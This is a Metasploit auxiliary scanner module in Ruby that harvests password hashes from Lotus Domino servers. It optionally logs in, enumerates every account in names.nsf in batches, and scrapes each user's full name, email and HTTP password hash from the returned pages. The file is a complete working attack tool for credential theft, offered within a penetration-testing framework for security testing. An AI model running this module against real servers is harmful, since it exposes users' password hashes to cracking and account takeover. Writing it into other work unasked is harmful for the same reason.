##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Lotus Domino Password Hash Collector',
			'Version'        => '$Revision$',
			'Description'    => 'Get users passwords hashes from names.nsf page',
			'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
			'License'        => MSF_LICENSE
		)

		register_options(
		[
			OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
			OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
			OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf']),
			OptString.new('START_INDEX', [false, 'Index to start at', '1']),
			OptString.new('STEP_SIZE', [false, 'Number of records to enumerate at once', '10000']),
		], self.class)

	end

	def run_host(ip)

		user = datastore['NOTES_USER'].to_s
		pass = datastore['NOTES_PASS'].to_s
		$uri =  datastore['URI'].to_s

		proto = ssl ? "https" : "http"
		$site = "#{proto}://#{vhost}:#{rport}"

		formauth = false
		if (user.length != 0)
			begin
				res = send_request_raw({
					'method'  => 'GET',
					'uri'     => "#{$uri}",
				}, 25)
			rescue
				print_error("#{$site} - Initial connection to test auth failed")
				return
			end

			if (res and res.code == 401)
				print_status("#{$site} - Lotus Domino - Site appears to use basic authentication")
				datastore['BasicAuthUser'] = user
				datastore['BasicAuthPass'] = pass
			elsif (res and res.code == 200)
				print_status("#{$site} - Lotus Domino - Site appears to use form authentication")
				formauth = true
			else
				print_error("#{$site} - Lotus Domino - Unrecognized #{res.code} response")
				return :abort
			end
		end

		if (formauth)
			print_status("#{$site} - Lotus Domino - Trying to dump password hashes with given credentials")
			do_login(user, pass)

		else
			if (user.length == 0 and pass.length == 0)
				print_status("#{$site} - Lotus Domino - Trying to dump password hashes without credentials")
			else
				print_status("#{$site} - Lotus Domino - Trying to dump password hashes with basic auth credentials")
			end

			begin
				res = send_request_raw({
					'method'  => 'GET',
					'uri'     => "#{$uri}\/$defaultview?Readviewentries",
				}, 25)
			rescue
				print_error("#{$site} - Initial connection failed")
				return
			end

			if (res and res.body.to_s =~ /\<viewentries/)
				print_good("#{$site} - Lotus Domino - OK names.nsf accessible")
				cookie = ''
				get_views(cookie,$uri)

			elsif (res and res.body.to_s =~ /names.nsf\?Login/)
				print_error("#{$site} - Lotus Domino - The remote server requires authentication")
				return :abort

			elsif (res and res.code == 401)
				if (user.length == 0 and pass.length == 0)
					print_error("#{$site} - Lotus Domino - The remote server requires basic authentication")
				else
					print_error("#{$site} - Lotus Domino - Basic authentication failed")
				end
				return :abort
			else
				print_error("#{$site} - Lotus Domino - Unrecognized #{res.code} response")
				return :abort
			end
		end
	end

	def do_login(user=nil,pass=nil)
		post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"

		begin
			res = send_request_cgi({
				'method'  => 'POST',
				'uri'     => '/names.nsf?Login',
				'data'    => post_data,
			}, 20)
		rescue
			print_error("#{$site} - Lotus Domino - Login connection failed")
			return
		end

		if (res and res.code == 302 )
			if res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
				cookie = "DomAuthSessId=#{$1}"
			elsif res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/LtpaToken=(.*);(.*)/i)
				cookie = "LtpaToken=#{$1}"
			else
				print_error("#{$site} - Lotus Domino - Unrecognized 302 response")
				return :abort
			end
			print_good("#{$site} - Lotus Domino - SUCCESSFUL authentication for '#{user}'")
			print_status("#{$site} - Lotus Domino - Getting password hashes")
			get_views(cookie,$uri)

		elsif (res and res.body.to_s =~ /names.nsf\?Login/)
			print_error("#{$site} - Lotus Domino - Authentication error: failed to login as '#{user}'")
			return :abort
		else
			print_error("#{$site} - Lotus Domino - Unrecognized #{res.code} response")
			return :abort
		end
	end

	def get_views(cookie,uri)

		start = datastore['START_INDEX'].to_i
		step = datastore['STEP_SIZE'].to_i

		begin
			res = send_request_raw({
				'method'  => 'GET',
				'uri'     => "#{uri}\/$defaultview?Readviewentries",
				'cookie'  => cookie,
			}, 25)
		rescue
			print_error("#{$site} - Lotus Domino - Request to enumerate entries failed")
			return
		end

		if (not res or not res.body)
			print_error("#{$site} - Lotus Domino - Request to enumerate entries failed")
			return
		end

		max = res.body.scan(/siblings=\"(.*)\"/)[0].join

		print_good("#{$site} - Lotus Domino - #{max} potential accounts found")

		(start .. max.to_i).step(step) {|i|
			begin
				res = send_request_raw({
					'method'  => 'GET',
					'uri'     => "#{uri}\/$defaultview?Readviewentries&Start=#{i}&Count=#{step}",
					'cookie'  => cookie,
				}, 25)
			rescue
				print_error("#{$site} - Lotus Domino - Request for batch of users starting at #{i} failed, stopping dump. Use START_INDEX to resume the dump")
				return
			end

			if (not res or not res.body)
				print_error("#{$site} - Lotus Domino - Request for batch of users starting at #{i} failed, stopping dump. Use START_INDEX to resume the dump")
				return
			end

			current = i
			res.body.scan(/unid="([^\s]+)"/){ |viewId|
				current = current + 1
				if dump_hashes(viewId[0],cookie,uri) == -1
					print_error("#{$site} - Lotus Domino - Request for entry #{current} failed, stopping dump. Use START_INDEX to resume the dump")
					return
				end
			}
		}

		print_good("#{$site} - Lotus Domino - All accounts successfully dumped")
	end

	def dump_hashes(view_id,cookie,uri)

		begin
			res = send_request_raw({
				'method'  => 'GET',
				'uri'     => "#{uri}\/$defaultview/#{view_id}?OpenDocument",
				'cookie'  => cookie,
			}, 25)
		rescue
			return -1
		end

		if (not res or not res.body)
			return -1
		end

		full_name = res.body.scan(/<INPUT NAME=\"FullName\" TYPE=(?:.*) VALUE=\"(.*?)"/i).join
		user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
		pass_hash = res.body.scan(/<INPUT NAME=\"dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join

		if full_name.to_s.strip.empty?
			full_name = 'NULL'
		end

		if user_mail.to_s.strip.empty?
			user_mail = 'NULL'
		end

		if pass_hash.to_s.strip.empty?
			pass_hash = 'NULL'
		end

		print_good("#{$site} - Lotus Domino - Account Found: #{full_name}, #{user_mail}, #{pass_hash}")

		if pass_hash != 'NULL'
			domino_svc = report_service(
				:host => rhost,
				:port => rport,
				:name => (ssl ? "https" : "http")
			)

			report_auth_info(
				:host        => rhost,
				:port        => rport,
				:sname       => (ssl ? "https" : "http"),
				:user        => full_name,
				:pass        => pass_hash,
				:ptype       => "domino_hash",
				:source_id   => (domino_svc ? domino_svc.id : nil),
				:source_type => "service",
				:proof       => "WEBAPP=\"Lotus Domino\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}",
				:active      => true
			)
		end

		return 1
	end
end
